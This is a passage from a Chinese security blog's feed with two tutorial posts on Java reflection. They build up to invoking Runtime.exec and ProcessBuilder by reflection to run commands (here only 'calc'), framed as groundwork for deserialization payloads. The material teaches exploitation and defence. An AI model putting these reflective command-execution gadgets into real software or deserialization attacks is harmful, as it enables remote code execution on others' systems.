    <link href="https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/</id>
    <published>2020-05-12T08:42:16.000Z</published>
    <updated>2020-05-13T02:30:32.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; 众所周知，Java目前影响最大的是反序列化漏洞，换一句话说Java安全是从反序列化漏洞开始，但反序列化漏洞又可以基于反射，这次笔者带你走进Java安全的大门。<br>&emsp;&emsp; Java反序列化的payload大多与反射机制密切相关，但仅仅是因为这个吗？答案肯定是片面的。反射作为大多数编程语言里必不可缺的组成部分，对象可以通过反射获取其他的类，类可以通过反射拿到所有的方法（包括私有方法），获取到方法可以调用。一句话，反射给Java等类似的静态语言赋予了<code>“灵魂”</code>。</p><p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="反射基础"><a href="#反射基础" class="headerlink" title="反射基础"></a>反射基础</h1><p>&emsp;&emsp; Java反射操作的对象是<code>java.lang.Class</code>对象，如果想要使用Java反射，首先得获取Class对象。下面我们看一段代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Class cls = Class.forName(className);</span><br><span class="line">cls.getMethod(methodName).invoke(cls.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码中，笔者演示几个比较重要的方法：</p><ul><li>获取类对象的方法<code>forName</code></li><li>从获取类对象中获取方法 <code>getMethod</code></li><li>执行得到获取的方法的方法<code>invoke</code></li><li>实例化对象<code>newInstance</code></li></ul><p>ps：当然反射不可能仅仅只是这些方法，下面中笔者有提及其他的方法，当然不可能是全部都一一道来，正所谓<code>授之与鱼，不如授之于渔</code>。更多方法建议大家去看JDK文档，在线的文档百度一搜就有。</p><hr><h2 id="类源码"><a href="#类源码" class="headerlink" title="类源码"></a>类源码</h2><p>&emsp;&emsp; 首先笔者构造了两个类<code>students</code>和<code>classdemo1</code>。</p><hr><h3 id="实体类students源码："><a href="#实体类students源码：" class="headerlink" title="实体类students源码："></a>实体类<code>students</code>源码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Students</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"samny"</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer CardId = <span class="number">332323223</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer id = <span class="number">10012</span>;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">"hello world"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">(Integer age, String name, Integer cardId, Integer id, String hello)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.CardId = cardId;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.hello = hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Students&#123;"</span> +</span><br><span class="line">                <span class="string">"age="</span> + age +</span><br><span class="line">                <span class="string">", name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", CardId="</span> + CardId +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">", ags='"</span> + hello + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 以下省略set，get以及toString方法。</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="实体类classdemo1的源码："><a href="#实体类classdemo1的源码：" class="headerlink" title="实体类classdemo1的源码："></a>实体类<code>classdemo1</code>的源码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classdemo1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String  name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"parameterlessMethod：hello"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print2</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"parameterMethod: hello"</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="反射方法获取Students类。"><a href="#反射方法获取Students类。" class="headerlink" title="反射方法获取Students类。"></a>反射方法获取Students类。</h3><blockquote><p>实例化所需要的类集合  Class[] classes = new Class[]{Integer.class,String.class,Integer.class,Integer.class,String.class};<br>通过构造器构造类Constructor constructor = cls.getDeclaredConstructor(classes);<br>通过调用有参构造器实例化类Object str = constructor.newInstance(18, “samny”, 32326663, 10021, “hello!!”);</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line"></span><br><span class="line">            Class cls = Class.forName(<span class="string">"samny.reflection.Students"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            // 获取构造器方法</span></span><br><span class="line">            Class[] classes = <span class="keyword">new</span> Class[]&#123;Integer<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">                    <span class="title">Integer</span>.<span class="title">class</span>,<span class="title">Integer</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>&#125;</span>;</span><br><span class="line">            Constructor constructor = cls.getDeclaredConstructor(classes);</span><br><span class="line"></span><br><span class="line">            Object str = constructor.newInstance(<span class="number">18</span>, <span class="string">"samny"</span>, <span class="number">32326663</span>, <span class="number">10021</span>, <span class="string">"hello!!"</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">            <span class="comment">// 或者下面这样子输出</span></span><br><span class="line"><span class="comment">//            System.out.println(constructor.newInstance(18, "samny", 32326663, 10021, "hello!!"));</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException |</span><br><span class="line">                IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="常规开发人员实例化类构造类demo"><a href="#常规开发人员实例化类构造类demo" class="headerlink" title="常规开发人员实例化类构造类demo"></a>常规开发人员实例化类构造类demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Sts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Students students = <span class="keyword">new</span> Students();</span><br><span class="line">        students.setAge(<span class="number">18</span>);</span><br><span class="line">        students.setName(<span class="string">"samny"</span>);</span><br><span class="line">        students.setCardId(<span class="number">32336666</span>);</span><br><span class="line">        students.setId(<span class="number">1001</span>);</span><br><span class="line">        students.setAgs(<span class="string">"helloooo!!"</span>);</span><br><span class="line">        System.out.println(students.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对比一下效果是没有任何的区别，但反射操作只需要知道类名就可以完全操作类甚至是类中的私有方法之后文章会详细说明，本文不做说明。<br><img src="https://img-blog.csdnimg.cn/20200428161706305.png" alt="在这里插入图片描述"></p><hr><h3 id="反射调用类中的无参和有参方法。"><a href="#反射调用类中的无参和有参方法。" class="headerlink" title="反射调用类中的无参和有参方法。"></a>反射调用类中的无参和有参方法。</h3><blockquote><p>之前说过的知识就不在说明<br>开头就说了，invoke是执行获取类得到方法的方法<br>但调用有参方法和无参方法有点细微的差别<br><code>getMethod</code>方法的第一个参数是类方法名称，第二个是类对象。这里先留个疑问，如果是多个类对象呢？<br><code>invoke</code>函数的第一个参数是<code>实例化</code>的类对象，第二个是参数值<br>常规方法的调用，直接<code>Class.method()</code>即可</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class  cls = Class.forName(<span class="string">"samny.reflection.classdemo1"</span>);</span><br><span class="line">            <span class="comment">// 无参方法调用</span></span><br><span class="line">            Object ob = cls.newInstance();</span><br><span class="line"><span class="comment">//            Method mt = cls.getMethod("print"); 有没有null均可</span></span><br><span class="line">            Method mt = cls.getMethod(<span class="string">"print"</span>,<span class="keyword">null</span>);</span><br><span class="line">            mt.invoke(ob,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 有参方法调用</span></span><br><span class="line">            Method mt2 = cls.getMethod(<span class="string">"print2"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mt2.invoke(ob,<span class="string">"world"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200428162508475.png" alt="在这里插入图片描述"></p><hr><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神-Java安全漫谈-反射篇</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--前章</title>
    <link href="https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/</id>
    <published>2020-05-12T04:42:16.000Z</published>
    <updated>2020-05-13T02:29:56.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; 欢迎回来，上回说到Java反射机制基础知识，并用简单代码做了一个简单的Demo。<br>&emsp;&emsp;笔者从执行命令的角度来展开话题，看这篇文章大部分都是网络安全的从业者亦或者是安全规范的学习者，众所周知执行命令获取权限是安全人员追求，也是黑客最终追求。所以从执行命令的角度来展开，无疑是激发你们读者最大阅读兴趣。</p><p> ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><p>&emsp;&emsp; 这里稍微补充一点小知识，对于一些0基础的读者的一些知识补充，老司机可以忽视。Java执行命令常见的有两个类<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>，通常情况下使用<code>java.lang.Runtime</code>类，个人觉得Runtime类是比ProcessBuilder好使用些。</p><h2 id="windows下执行命令的几种方式"><a href="#windows下执行命令的几种方式" class="headerlink" title="windows下执行命令的几种方式"></a>windows下执行命令的几种方式</h2><ol><li>Windows下调用程序 <blockquote><p>Process proc =Runtime.getRuntime().exec(“exefile”);</p><ol start="2"><li>Windows下调用系统命令<br>String [] cmd={“cmd”,”/C”,”copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</li><li>Windows下调用系统命令并弹出命令行窗口<br>String [] cmd={“cmd”,”/C”,”start copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</li></ol></blockquote><h2 id="Linux下执行命令的几种方式"><a href="#Linux下执行命令的几种方式" class="headerlink" title="Linux下执行命令的几种方式"></a>Linux下执行命令的几种方式</h2><ol><li>Linux下调用程序<blockquote><p>Process proc =Runtime.getRuntime().exec(“./exefile”);</p></blockquote></li><li>Linux下调用系统命令<blockquote><p>String [] cmd={“/bin/sh”,”-c”,”ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li><li>Linux下调用系统命令并弹出命令行窗口<blockquote><p>String [] cmd={“/bin/sh”,”-c”,”xterm -e ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote></li></ol></li></ol><hr><h1 id="反射之Runtime"><a href="#反射之Runtime" class="headerlink" title="反射之Runtime"></a>反射之Runtime</h1><p><img src="https://img-blog.csdnimg.cn/20200428212414156.gif" alt="在这里插入图片描述"></p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><blockquote><p>Object ob = cls.getMethod(“getRuntime”,null).invoke(null,null);<br>返回的是一个Runtime类对象<br>前文说过，invoke第一个参数是一个<code>Object类对象</code><br>你可能好奇为什么我不直接使用<code>newInstance()</code>呢？<br>因为Runtime类中的无参构造方法是private权限，无法访问。ps：其实是有办法的，下文会说道。<br><code>getRuntime</code>方法返回的是Runtime类对象，这就是为什么有些payload会使用此方法了，而不是直接newInstanc()</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200428204852586.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">            <span class="comment">//实例化对象</span></span><br><span class="line">            Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 反射调用执行命令</span></span><br><span class="line">            cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote><p>前文说过java.lang.Runtime类无参构造方法是private权限无法直接调用<br>setAccessible通过反射修改方法的访问权限，强制可以访问<br> Constructor constructor = cls.getDeclaredConstructor();是获取类构造器方法的方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 获取对象</span></span><br><span class="line">           Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">// 获取构造方法</span></span><br><span class="line">           Constructor constructor = cls.getDeclaredConstructor();</span><br><span class="line">           </span><br><span class="line">           constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           <span class="comment">// 实例化对象</span></span><br><span class="line">           Object ob = constructor.newInstance();</span><br><span class="line">           Method mt = cls.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">           mt.invoke(ob,<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="反射之ProcessBuilder"><a href="#反射之ProcessBuilder" class="headerlink" title="反射之ProcessBuilder"></a>反射之ProcessBuilder</h1><p><img src="https://img-blog.csdnimg.cn/20200428212703809.gif" alt="在这里插入图片描述"></p><p>通过看JDK文档，ProcessBuilder类有两个构造方法。<br><img src="https://img-blog.csdnimg.cn/20200428204717485.png" alt="在这里插入图片描述"><br>如果分别使用反射构造方法获取实例化语句如下：</p><ul><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)))</code></li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructor(String.class).newInstance(&quot;calc&quot;))</code></li></ul><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>&emsp;&emsp; 方法一笔者在此就提一点，<code>newInstance()</code>实例化时把所需要执行命令参数直接一并进行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            Object ob = cls.getDeclaredConstructor(List<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">            ).newInstance(Arrays.asList("calc"));</span><br><span class="line">            <span class="comment">// 执行命令</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>&emsp;&emsp; 方法二使用第二种构造方法，可变长参数(<code>String...</code>表示参数长度不确定)。那么对于反射来说，如果要获取目标函数里包含的可变长参数，可直接视为数组。因此只需要将<code>String [].class</code>传给构造方法即可，但在调用<code>newInstance()</code>实例化方法时，不能直接传一个一维数组<code>String[]{“calc&quot;}</code>，而是应该传入一个二维数组<code>String[][]calc</code>。因为<code>newInstance()</code>函数本身接收的是一个可变长参数，我们传给<code>ProcessBuilder</code>的也是一个可变长参数，二者叠加由一维数组变成了二维数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line">            Class cls = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">            <span class="comment">// 实例化对象</span></span><br><span class="line">            </span><br><span class="line">            String[][] cls2 = <span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc"</span>&#125;&#125;;</span><br><span class="line">            Object ob = cls.getConstructor(String[]<span class="class">.<span class="keyword">class</span>).<span class="title">newInstance</span>(<span class="title">cls2</span>)</span>;</span><br><span class="line">            <span class="comment">//执行命令</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7029#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7029#toc-3</a><br><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a><br>JDK文档<br>Java安全漫谈-反射篇 –P牛著。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
